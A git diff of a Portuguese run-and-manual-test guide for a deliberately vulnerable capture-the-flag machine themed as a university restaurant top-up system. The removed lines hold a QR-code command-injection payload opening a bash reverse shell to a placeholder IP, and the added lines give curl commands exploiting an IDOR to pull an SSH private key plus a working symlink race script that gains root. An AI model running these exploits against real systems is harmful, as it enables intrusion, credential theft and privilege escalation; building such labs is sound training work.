@@ -1,101 +1,170 @@
-# Guia de Execução / Teste Manual
+# Guia de Execução e Teste Manual — Sistema de Recarga do RU
 
-> A preencher conforme a implementação avança. Esqueleto inicial abaixo para já
-> estruturar o passo a passo reproduzível, comando por comando.
+**Atualizado em:** 10/11/2026. Comandos para o laboratório local, executados na raiz do repositório salvo indicação contrária. Os passos da etapa 1 e da obtenção da flag root ainda precisam de playtest integrado.
 
 ## Pré-requisitos
 
-- Docker e Docker Compose instalados.
-- Um cliente de SSH.
-- Uma ferramenta para gerar QR Code a partir de texto arbitrário (ex.: `qrencode`).
+- Docker com Compose; cliente OpenSSH; Python 3.
+- Ferramentas de QR Code para a etapa 1, conforme os testes existentes.
+- Par de chaves de laboratório em `services/admin-api/dados/chave_operador_caixa.pem` e `chave_operador_caixa.pub` (a chave privada é entregue pela API vulnerável).
 
-## Subindo o ambiente
-
-```bash
-cd deploy
-docker compose up --build -d
-docker compose logs -f   # acompanhar inicialização
-```
-
-## Etapa 1 — Acesso inicial
-
-Implementada. Validação manual:
-
-- [ ] Acessar `http://localhost:8000` no navegador.
-- [ ] Gerar uma imagem de QR Code contendo, por exemplo:
-      `0; bash -c 'bash -i >& /dev/tcp/SEU_IP/4444 0>&1'`
-      (qualquer gerador de QR Code a partir de texto serve, ex.: `qrencode -o payload.png "0; bash -c 'bash -i >& /dev/tcp/SEU_IP/4444 0>&1'"`).
-- [ ] Subir listener local antes do upload: `nc -lvnp 4444`.
-- [ ] Fazer upload da imagem do QR Code em `http://localhost:8000`.
-- [ ] Confirmar shell recebida como `ru_web` (`whoami`).
-- [ ] Ler `/home/ru_web/user.txt` (flag 1).
-
-Validação automatizada (requer o container no ar — ver `tests/exploit_etapa1.py`):
+## Subir, inspecionar e encerrar
 
 ```bash
-cd tests
-pip install -r requirements.txt
-python3 exploit_etapa1.py --target-url http://localhost:8000 \
-  --listen-host host.docker.internal --listen-port 4444
+sudo docker compose -f deploy/docker-compose.yml up --build -d
+sudo docker ps --filter name=ru-machine
+sudo docker logs --tail 80 ru-machine
 ```
 
-Testes em camadas (sem precisar do container; rodados nesta sessão de design):
+Portas publicadas no ambiente de desenvolvimento: portal `0.0.0.0:8000`, SSH `127.0.0.1:2222`. Painel `8081` e API `9090` são internos e **não** devem ser publicados para contornar a etapa de enumeração.
+
+Se surgir `exec /entrypoint.sh: exec format error`, conferir se `#!/bin/bash` é o **primeiro byte** do arquivo (sem linha vazia/BOM) e se as quebras são Unix:
 
 ```bash
-cd tests
-python3 test_decode_qr.py     # camada 1: ciclo QR (gerar imagem -> decodificar) isolado
-python3 test_app_client.py    # camada 2: Flask app.test_client(), sem rede/container
+head -c 32 deploy/entrypoint.sh | xxd
+bash -n deploy/entrypoint.sh
 ```
 
-## Etapa 2 — Pivot até o painel
-
-- [ ] `ss -tulpn` a partir do shell em `ru_web`, confirmar portas `8081` e `9090` só em
-      `127.0.0.1`.
-- [ ] (Opcional) Túnel: `ssh -L 8081:127.0.0.1:8081 ...` — a documentar o método exato
-      de acesso ao shell inicial que viabiliza isso.
-- [ ] Acessar o painel e localizar o formulário "Consulta de Operadores / Turnos".
-
-## Etapa 3 — IDOR
-
-Implementada. Validação manual da lógica (testada e confirmada via testes locais):
-
-- [x] Listar operadores da API interna:
-      `curl -s http://127.0.0.1:9090/api/v1/operadores | python3 -m json.tool`
-- [x] Enumerar operadores individualmente:
-      ```bash
-      curl -s http://127.0.0.1:9090/api/v1/operadores/1 | python3 -m json.tool
-      curl -s http://127.0.0.1:9090/api/v1/operadores/2 | python3 -m json.tool
-      curl -s http://127.0.0.1:9090/api/v1/operadores/3 | python3 -m json.tool
-      ```
-- [x] Confirmar que o operador ID 3 (`operador_caixa`) retorna chave SSH privada no
-      campo `chave_privada` (IDOR: sem controle de autorização).
-- [x] Extrair a chave para arquivo local com permissão correta:
-      ```bash
-      curl -s http://127.0.0.1:9090/api/v1/operadores/3 \
-        | python3 -c "import sys,json; print(json.load(sys.stdin)['chave_privada'])" \
-        > /tmp/operador_caixa.pem
-      chmod 600 /tmp/operador_caixa.pem
-      ```
-- [ ] Conectar via SSH: `ssh -p 2222 -i /tmp/operador_caixa.pem operador_caixa@localhost` (pendente setup do SSH na imagem).
-- [ ] Ler `/home/operador_caixa/user.txt` (flag 2 — pendente setup do usuário na imagem).
-
-Testes em camadas automatizados (todos passando ✅):
-
-- [x] `tests/test_idor_logica.py`: Camada 1 — admin-api como subprocesso real, valida listagem e extração de chave via IDOR.
-- [x] `tests/test_painel_client.py`: Camada 2 — Flask `test_client()` do painel + admin-api real, valida formulário de consulta e vazamento de credencial.
-
-## Etapa 4 — Escalação de privilégio
-
-- [ ] Como `operador_caixa`, localizar o diretório/script do job de conciliação de
-      caixa.
-- [ ] Identificar o padrão TOCTOU (checagem de existência seguida de leitura/escrita
-      sem `O_NOFOLLOW`).
-- [ ] Plantar symlink malicioso apontando para o alvo definido em `decisoes.md`.
-- [ ] Aguardar a próxima execução (até 90s).
-- [ ] Confirmar efeito como root e ler `/root/root.txt` (flag 3).
-
-## Derrubando o ambiente
+Para derrubar:
 
 ```bash
-docker compose down
+sudo docker compose -f deploy/docker-compose.yml down
 ```
+
+## Etapa 1 — Acesso inicial via QR Code
+
+1. Acessar `http://127.0.0.1:8000`.
+2. Enumerar `/beta` e o recurso de carteirinha de teste `/carterinha-teste.jpg` conforme a kill chain.
+3. Verificar o comportamento do QR Code e a execução de comandos pelo script legado.
+4. No teste autorizado, confirmar obtenção de shell como `ru_web` e leitura de `/home/ru_web/user.txt`.
+
+Os testes históricos `tests/test_decode_qr.py` e `tests/test_app_client.py` cobrem camadas isoladas. **A shell real via QR Code ainda não foi revalidada nesta rodada.**
+
+## Etapa 2 — Enumeração interna
+
+Depois de obter uma shell como `ru_web` **dentro do container**:
+
+```bash
+whoami
+ps aux
+# Se a ferramenta estiver instalada:
+ss -tulpn
+```
+
+Serviços esperados: painel em `127.0.0.1:8081` e API em `127.0.0.1:9090`. Um `curl` do Kali para `127.0.0.1:9090` falhará porque esse endereço é o loopback do Kali, não do container. Não é necessário port forwarding para fazer consultas a partir de `ru_web`.
+
+Para inspeção administrativa durante o desenvolvimento (não é o fluxo do jogador):
+
+```bash
+sudo docker exec ru-machine python3 -c '
+import urllib.request
+print(urllib.request.urlopen("http://127.0.0.1:9090/api/v1/operadores").read().decode())
+'
+```
+
+## Etapa 3 — IDOR e acesso SSH
+
+**Estes comandos HTTP devem ser executados na shell interna `ru_web`**, não no terminal Kali:
+
+```bash
+curl -s http://127.0.0.1:9090/api/v1/operadores
+curl -s http://127.0.0.1:9090/api/v1/operadores/1
+curl -s http://127.0.0.1:9090/api/v1/operadores/2
+curl -s http://127.0.0.1:9090/api/v1/operadores/3
+```
+
+O registro 3 inclui `chave_privada`. Para extrair sem alterar as quebras de linha:
+
+```bash
+curl -s http://127.0.0.1:9090/api/v1/operadores/3 \
+  | python3 -c 'import sys,json; print(json.load(sys.stdin)["chave_privada"],end="")' \
+  > /tmp/operador_caixa.pem
+chmod 600 /tmp/operador_caixa.pem
+```
+
+Para acessar o SSH a partir do **Kali**, a chave extraída precisa estar disponível nele. Durante o desenvolvimento, a chave local pode ser usada apenas para verificar o serviço:
+
+```bash
+ssh -i services/admin-api/dados/chave_operador_caixa.pem \
+  -o IdentitiesOnly=yes -p 2222 operador_caixa@127.0.0.1
+```
+
+O teste realizado autenticou como UID 1001 e permitiu `cat ~/user.txt`, exibindo a flag 2. **Ainda falta validar o transporte da chave efetivamente extraída da API até o Kali**, sem recorrer à cópia de desenvolvimento.
+
+Port forwarding SSH é **opcional e posterior** à obtenção da chave, para inspeção do serviço interno:
+
+```bash
+ssh -i services/admin-api/dados/chave_operador_caixa.pem \
+  -p 2222 -L 9090:127.0.0.1:9090 operador_caixa@127.0.0.1
+```
+
+Enquanto a sessão estiver aberta, outro terminal do Kali poderá usar `curl http://127.0.0.1:9090/api/v1/operadores`. Esse túnel não faz parte do caminho necessário para descobrir a chave.
+
+## Etapa 4 — Enumeração e TOCTOU
+
+Na sessão SSH como `operador_caixa`:
+
+```bash
+whoami
+ps aux
+ls -la /var/ru/caixa
+ls -la /opt
+cat /opt/conciliacao.py
+cat /opt/helper_conciliacao.sh  # esperado: Permission denied
+ls -l /root/root.txt           # esperado: Permission denied
+```
+
+O job root lê `dados.csv`, faz `lstat()` em `conciliacao.tmp`, espera 15 segundos e depois escreve com `open(..., 'w')`. O operador controla os dados e o nome do arquivo temporário; a troca por symlink permite sobrescrever `/opt/helper_conciliacao.sh` antes de sua execução pelo job.
+
+### Prova de conceito realizada via SSH
+
+**Atenção: teste destrutivo para o helper; executar somente em instância descartável e recriar o container ao final.**
+
+```bash
+cat > /var/ru/caixa/dados.csv <<'EOF_PAYLOAD'
+#!/bin/bash
+id > /var/ru/prova_ssh.txt
+EOF_PAYLOAD
+
+cat > /tmp/testar_toctou.sh <<'EOF_RACE'
+#!/bin/bash
+DIR="/var/ru/caixa"
+ALVO="/opt/helper_conciliacao.sh"
+while true; do
+    rm -f "$DIR/conciliacao.tmp"
+    printf 'aguardando\n' > "$DIR/conciliacao.tmp"
+    sleep 5
+    rm -f "$DIR/conciliacao.tmp"
+    ln -s "$ALVO" "$DIR/conciliacao.tmp"
+    sleep 5
+done
+EOF_RACE
+chmod +x /tmp/testar_toctou.sh
+/tmp/testar_toctou.sh
+```
+
+Após aguardar alguns ciclos, interromper com `Ctrl+C` e verificar:
+
+```bash
+cat /var/ru/prova_ssh.txt
+```
+
+**Resultado observado:** `uid=0(root) gid=0(root) groups=0(root)`. A prova de conceito confirma execução de comandos como root, mas não demonstra, por si só, uma shell interativa ou a leitura de `/root/root.txt`.
+
+### Restaurar depois da exploração
+
+Sair da sessão SSH e, no Kali, recriar o container:
+
+```bash
+sudo docker compose -f deploy/docker-compose.yml up --build --force-recreate -d
+sudo docker ps --filter name=ru-machine
+```
+
+A recriação descarta alterações no filesystem gravável do container (desde que não existam volumes persistentes adicionados posteriormente). Verificar que o helper original voltou antes de repetir testes.
+
+## Pendências de QA
+
+- Testar a cadeia completa a partir do QR Code até a recuperação da flag root.
+- Auditar permissões da chave privada contra leitura direta por `ru_web`.
+- Remover comentários explicativos da TOCTOU no código distribuído.
+- Testar repetibilidade e ajustar exposição SSH para a plataforma dos jogadores.
